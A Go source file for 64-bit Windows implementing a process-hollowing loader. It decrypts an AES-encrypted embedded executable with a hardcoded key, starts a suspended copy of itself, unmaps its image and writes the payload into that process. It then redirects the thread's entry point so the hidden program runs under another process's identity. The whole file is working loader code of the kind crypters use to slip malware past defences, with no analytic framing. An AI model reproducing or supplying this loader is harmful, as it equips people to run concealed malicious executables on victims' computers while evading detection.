package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/sha256"
	"debug/pe"
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

const (
	CONTEXT_FULL    = 0x10000b
	CONTEXT_AMD64   = 0x100000
	CONTEXT_INTEGER = (CONTEXT_AMD64 | 0x2)

	CREATE_SUSPENDED = 0x00000004
	MEM_RELEASE      = 0x8000
	MEM_COMMIT       = 0x1000
	MEM_RESERVE      = 0x2000

	IMAGE_NT_OPTIONAL_HDR32_MAGIC = 0x10b
	IMAGE_NT_OPTIONAL_HDR64_MAGIC = 0x20b
	IMAGE_ROM_OPTIONAL_HDR_MAGIC  = 0x107

	IMAGE_DOS_SIGNATURE = 0x5A4D
	IMAGE_NT_SIGNATURE  = 0x00004550

	MAX_PATH = 260

	IMAGE_DIRECTORY_ENTRY_BASERELOC  = 5
	IMAGE_NUMBEROF_DIRECTORY_ENTRIES = 16
	IMAGE_SIZEOF_SECTION_HEADER      = 40

	PAGE_EXECUTE_READWRITE = 0x40
	PAGE_READWRITE         = 0x04

	IMAGE_SUBSYSTEM_WINDOWS_GUI = 2

	RELOC_32BIT_FIELD = 3
	RELOC_64BIT_FIELD = 0xA
)

var (
	kernel32                  = windows.NewLazySystemDLL("kernel32.dll")
	ntdll                     = windows.NewLazySystemDLL("ntdll.dll")
	procVirtualAlloc          = kernel32.NewProc("VirtualAlloc") //virtual
	procVirtualProtect        = kernel32.NewProc("VirtualProtect")
	procRtlCopyMemory         = ntdll.NewProc("RtlCopyMemory")
	procGetFileSize           = kernel32.NewProc("GetFileSize")
	procGetThreadContext      = kernel32.NewProc("GetThreadContext")
	procWriteProcessMemory    = kernel32.NewProc("WriteProcessMemory")
	procCreateProcessA        = kernel32.NewProc("CreateProcessA")
	procIsBadReadPtr          = kernel32.NewProc("IsBadReadPtr")
	procVirtualFree           = kernel32.NewProc("VirtualFree")
	procResumeThread          = kernel32.NewProc("ResumeThread")
	procVirtualAllocEx        = kernel32.NewProc("VirtualAllocEx")
	procWow64GetThreadContext = kernel32.NewProc("Wow64GetThreadContext")
	procWow64SetThreadContext = kernel32.NewProc("Wow64SetThreadContext")
	procSetThreadContext      = kernel32.NewProc("SetThreadContext")
	procReadProcessMemory     = kernel32.NewProc("ReadProcessMemory")
	// modntdll = windows.NewLazyDLL("ntdll.dll")
	procNtUnmapViewOfSection = ntdll.NewProc("NtUnmapViewOfSection")
	procGetModuleFileNameA   = kernel32.NewProc("GetModuleFileNameA")
)

// +build windows,amd64

func Inject(destPE []byte) {

	var handle syscall.Handle = 0

	var buf []byte
	size := uint32(1024)
	buf = make([]byte, size)

	procGetModuleFileNameA.Call(
		uintptr(handle),
		uintptr(unsafe.Pointer(&buf[0])),
		uintptr(size))

	buf = bytes.Trim(buf, "\x00")
	pathC := string(buf)

	cmd := syscall.StringToUTF16Ptr(pathC)

	Log("Creating process: %v", cmd)

	si := new(syscall.StartupInfo)
	pi := new(syscall.ProcessInformation)

	// CREATE_SUSPENDED := 0x00000004
	err2 := syscall.CreateProcess(cmd, nil, nil, nil, false, CREATE_SUSPENDED, nil, nil, si, pi) // replace this ?
	if err2 != nil {
		panic(err2)
	}
	hProcess := uintptr(pi.Process)
	hThread := uintptr(pi.Thread)

	Log("Process created. Process: %v, Thread: %v", hProcess, hThread)

	Log("Getting thread context of %v", hThread)
	ctx, err := GetThreadContext(hThread)
	if err != nil {
		panic(err)
	}

	Rdx := binary.LittleEndian.Uint64(ctx[136:])

	Log("Address to PEB[Rdx]: %x", Rdx)

	baseAddr, err := ReadProcessMemoryAsAddr(hProcess, uintptr(Rdx+16))
	if err != nil {
		panic(err)
	}

	Log("Base Address of Source Image from PEB[ImageBaseAddress]: %x", baseAddr)

	Log("Reading destination PE")

	destPEReader := bytes.NewReader(destPE)

	f, err := pe.NewFile(destPEReader)

	Log("Getting OptionalHeader of destination PE")
	oh, ok := f.OptionalHeader.(*pe.OptionalHeader64)
	if !ok {
		panic("OptionalHeader64 not found")
	}

	Log("ImageBase of destination PE[OptionalHeader.ImageBase]: %x", oh.ImageBase)
	Log("Unmapping view of section %x", baseAddr)
	if err := NtUnmapViewOfSection(hProcess, baseAddr); err != nil {
		panic(err)
	}

	Log("Allocating memory in process at %x (size: %v)", baseAddr, oh.SizeOfImage)

	newImageBase, err := VirtualAllocEx(hProcess, baseAddr, oh.SizeOfImage, MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE)
	if err != nil {
		panic(err)
	}
	Log("New base address %x", newImageBase)
	Log("Writing PE to memory in process at %x (size: %v)", newImageBase, oh.SizeOfHeaders)
	err = WriteProcessMemory(hProcess, newImageBase, destPE, oh.SizeOfHeaders)
	if err != nil {
		panic(err)
	}

	for _, sec := range f.Sections {
		Log("Writing section[%v] to memory at %x (size: %v)", sec.Name, newImageBase+uintptr(sec.VirtualAddress), sec.Size)
		secData, err := sec.Data()
		if err != nil {
			panic(err)
		}
		err = WriteProcessMemory(hProcess, newImageBase+uintptr(sec.VirtualAddress), secData, sec.Size)
		if err != nil {
			panic(err)
		}
	}
	Log("Calcuating relocation delta")
	delta := int64(oh.ImageBase) - int64(newImageBase)
	Log("Relocation delta: %v", delta)

	if delta != 0 && false {
		Log("Finding relocation directory")
		rel := oh.DataDirectory[pe.IMAGE_DIRECTORY_ENTRY_BASERELOC]
		Log("Relocation directory %x (size: %v)", rel.VirtualAddress, rel.Size)

		Log("Locating relocation section")
		relSec := findRelocSec(rel.VirtualAddress, f.Sections)
		if relSec == nil {
			panic(fmt.Sprintf(".reloc not found at %x", rel.VirtualAddress))
		}
		Log("Relocation section %x (size: %v)", relSec.VirtualAddress, relSec.Size)
		var read uint32
		d, err := relSec.Data()
		if err != nil {
			panic(err)
		}
		rr := bytes.NewReader(d)
		for read < rel.Size {
			Log("Reading relocation header")
			dd := new(pe.DataDirectory)
			binary.Read(rr, binary.LittleEndian, dd)
			Log("Relocation header %x (size: %v)", dd.VirtualAddress, dd.Size)

			read += 8
			reSize := (dd.Size - 8) / 2
			Log("Relocation entries %v", reSize)
			re := make([]baseRelocEntry, reSize)
			read += reSize * 2
			binary.Read(rr, binary.LittleEndian, re)
			for _, rrr := range re {
				Log("Relocation entry: Type: %x  Offset: %x", rrr.Type(), rrr.Offset()+dd.VirtualAddress)
				if rrr.Type() == IMAGE_REL_BASED_DIR64 {
					rell := newImageBase + uintptr(rrr.Offset()) + uintptr(dd.VirtualAddress)
					raddr, err := ReadProcessMemoryAsAddr(hProcess, rell)
					if err != nil {
						panic(err)
					}

					err = WriteProcessMemoryAsAddr(hProcess, rell, uintptr(int64(raddr)+delta))
					if err != nil {
						panic(err)
					}

				} else {
					Log("Invalid relocation entry type found %v", rrr.Type())
				}
			}
		}

	}
	Log("Writing new ImageBase to Rdx %x", newImageBase)
	addrB := make([]byte, 8)
	binary.LittleEndian.PutUint64(addrB, uint64(newImageBase))
	err = WriteProcessMemory(hProcess, uintptr(Rdx+16), addrB, 8)
	if err != nil {
		panic(err)
	}

	binary.LittleEndian.PutUint64(ctx[128:], uint64(newImageBase)+uint64(oh.AddressOfEntryPoint))
	Log("Setting new entrypoint to Rcx %x", uint64(newImageBase)+uint64(oh.AddressOfEntryPoint))

	Log("Setting thread context %v", hThread)
	err = SetThreadContext(hThread, ctx)
	if err != nil {
		panic(err)
	}

	Log("Resuming thread %v", hThread)
	_, err = ResumeThread(hThread)
	if err != nil {
		panic(err)
	}

}

func ResumeThread(hThread uintptr) (count int32, e error) {

	ret, _, err := procResumeThread.Call(hThread)
	if ret == 0xffffffff {
		e = err
	}
	count = int32(ret)
	Log("ResumeThread[%v]: [%v] %v", hThread, ret, err)
	return
}

func VirtualAllocEx(hProcess uintptr, lpAddress uintptr, dwSize uint32, flAllocationType int, flProtect int) (addr uintptr, e error) {

	ret, _, err := procVirtualAllocEx.Call(
		hProcess,
		lpAddress,
		uintptr(dwSize),
		uintptr(flAllocationType),
		uintptr(flProtect))
	if ret == 0 {
		e = err
	}
	addr = ret
	Log("VirtualAllocEx[%v : %x]: [%v] %v", hProcess, lpAddress, ret, err)

	return
}

func ReadProcessMemory(hProcess uintptr, lpBaseAddress uintptr, size uint32) (data []byte, e error) {

	var numBytesRead uintptr
	data = make([]byte, size)

	r, _, err := procReadProcessMemory.Call(hProcess,
		lpBaseAddress,
		uintptr(unsafe.Pointer(&data[0])),
		uintptr(size),
		uintptr(unsafe.Pointer(&numBytesRead)))
	if r == 0 {
		e = err
	}
	Log("ReadProcessMemory[%v : %x]: [%v] %v", hProcess, lpBaseAddress, r, err)
	return
}

func WriteProcessMemory(hProcess uintptr, lpBaseAddress uintptr, data []byte, size uint32) (e error) {

	var numBytesRead uintptr

	r, _, err := procWriteProcessMemory.Call(hProcess,
		lpBaseAddress,
		uintptr(unsafe.Pointer(&data[0])),
		uintptr(size),
		uintptr(unsafe.Pointer(&numBytesRead)))
	if r == 0 {
		e = err
	}
	Log("WriteProcessMemory[%v : %x]: [%v] %v", hProcess, lpBaseAddress, r, err)

	return
}

func GetThreadContext(hThread uintptr) (ctx []uint8, e error) {

	ctx = make([]uint8, 1232)

	// ctx[12] = 0x00100000 | 0x00000002 //CONTEXT_INTEGER flag to Rdx
	binary.LittleEndian.PutUint32(ctx[48:], 0x00100000|0x00000002)
	//other offsets can be found  at https://stackoverflow.com/questions/37656523/declaring-context-struct-for-pinvoke-windows-x64
	ctxPtr := unsafe.Pointer(&ctx[0])
	r, _, err := procGetThreadContext.Call(hThread, uintptr(ctxPtr))
	if r == 0 {
		e = err
	}
	Log("GetThreadContext[%v]: [%v] %v", hThread, r, err)

	return ctx, nil
}

func ReadProcessMemoryAsAddr(hProcess uintptr, lpBaseAddress uintptr) (val uintptr, e error) {
	data, err := ReadProcessMemory(hProcess, lpBaseAddress, 8)
	if err != nil {
		e = err
	}
	val = uintptr(binary.LittleEndian.Uint64(data))
	Log("ReadProcessMemoryAsAddr[%v : %x]: [%x] %v", hProcess, lpBaseAddress, val, err)
	return
}

func WriteProcessMemoryAsAddr(hProcess uintptr, lpBaseAddress uintptr, val uintptr) (e error) {
	buf := make([]byte, 8)
	binary.LittleEndian.PutUint64(buf, uint64(val))
	err := WriteProcessMemory(hProcess, lpBaseAddress, buf, 8)
	if err != nil {
		e = err
	}
	Log("WriteProcessMemoryAsAddr[%v : %x]: %v", hProcess, lpBaseAddress, err)
	return
}

func NtUnmapViewOfSection(hProcess uintptr, baseAddr uintptr) (e error) {

	r, _, err := procNtUnmapViewOfSection.Call(hProcess, baseAddr)
	if r != 0 {
		e = err
	}
	Log("NtUnmapViewOfSection[%v : %x]: [%v] %v", hProcess, baseAddr, r, err)
	return
}

func SetThreadContext(hThread uintptr, ctx []uint8) (e error) {

	ctxPtr := unsafe.Pointer(&ctx[0])
	r, _, err := procSetThreadContext.Call(hThread, uintptr(ctxPtr))
	if r == 0 {
		e = err
	}
	Log("SetThreadContext[%v]: [%v] %v", hThread, r, err)
	return
}

func Log(format string, args ...interface{}) {
	fmt.Printf(format+"\n", args...)
}

type baseRelocEntry uint16

func (b baseRelocEntry) Type() IMAGE_REL_BASED {
	return IMAGE_REL_BASED(uint16(b) >> 12)
}

func (b baseRelocEntry) Offset() uint32 {
	return uint32(uint16(b) & 0x0FFF)
}

func findRelocSec(va uint32, secs []*pe.Section) *pe.Section {
	for _, sec := range secs {
		if sec.VirtualAddress == va {
			return sec
		}
	}
	return nil
}

type IMAGE_REL_BASED uint16

const (
	IMAGE_REL_BASED_ABSOLUTE       IMAGE_REL_BASED = 0  //The base relocation is skipped. This type can be used to pad a block.
	IMAGE_REL_BASED_HIGH           IMAGE_REL_BASED = 1  //The base relocation adds the high 16 bits of the difference to the 16-bit field at offset. The 16-bit field represents the high value of a 32-bit word.
	IMAGE_REL_BASED_LOW            IMAGE_REL_BASED = 2  //The base relocation adds the low 16 bits of the difference to the 16-bit field at offset. The 16-bit field represents the low half of a 32-bit word.
	IMAGE_REL_BASED_HIGHLOW        IMAGE_REL_BASED = 3  //The base relocation applies all 32 bits of the difference to the 32-bit field at offset.
	IMAGE_REL_BASED_HIGHADJ        IMAGE_REL_BASED = 4  //The base relocation adds the high 16 bits of the difference to the 16-bit field at offset. The 16-bit field represents the high value of a 32-bit word. The low 16 bits of the 32-bit value are stored in the 16-bit word that follows this base relocation. This means that this base relocation occupies two slots.
	IMAGE_REL_BASED_MIPS_JMPADDR   IMAGE_REL_BASED = 5  //The relocation interpretation is dependent on the machine type.When the machine type is MIPS, the base relocation applies to a MIPS jump instruction.
	IMAGE_REL_BASED_ARM_MOV32      IMAGE_REL_BASED = 5  //This relocation is meaningful only when the machine type is ARM or Thumb. The base relocation applies the 32-bit address of a symbol across a consecutive MOVW/MOVT instruction pair.
	IMAGE_REL_BASED_RISCV_HIGH20   IMAGE_REL_BASED = 5  //This relocation is only meaningful when the machine type is RISC-V. The base relocation applies to the high 20 bits of a 32-bit absolute address.
	IMAGE_REL_BASED_THUMB_MOV32    IMAGE_REL_BASED = 7  //This relocation is meaningful only when the machine type is Thumb. The base relocation applies the 32-bit address of a symbol to a consecutive MOVW/MOVT instruction pair.
	IMAGE_REL_BASED_RISCV_LOW12I   IMAGE_REL_BASED = 7  //This relocation is only meaningful when the machine type is RISC-V. The base relocation applies to the low 12 bits of a 32-bit absolute address formed in RISC-V I-type instruction format.
	IMAGE_REL_BASED_RISCV_LOW12S   IMAGE_REL_BASED = 8  //This relocation is only meaningful when the machine type is RISC-V. The base relocation applies to the low 12 bits of a 32-bit absolute address formed in RISC-V S-type instruction format.
	IMAGE_REL_BASED_MIPS_JMPADDR16 IMAGE_REL_BASED = 9  //The relocation is only meaningful when the machine type is MIPS. The base relocation applies to a MIPS16 jump instruction.
	IMAGE_REL_BASED_DIR64          IMAGE_REL_BASED = 10 //The base relocation applies the difference to the 64-bit field at offset.
)

/*
   Checks for errors when reading in files
*/
func check(e error) {
	if e != nil {
		panic(e)
	}
}

func createHash(key string) []byte {
	hash := sha256.Sum256([]byte(key))
	return hash[:]
}

func decrypt(data []byte, passphrase string) []byte {
	key := []byte(createHash(passphrase))
	block, err := aes.NewCipher(key)
	if err != nil {
		panic(err.Error())
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		panic(err.Error())
	}
	nonceSize := gcm.NonceSize()
	nonce, ciphertext := data[:nonceSize], data[nonceSize:]
	plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		panic(err.Error())
	}
	return plaintext
}

func main() {

	//Main Proc
	const key = "test"
	data := getHexString()
	buf, _ := hex.DecodeString(data)
	pe := decrypt(buf, key)
	Inject(pe)

}
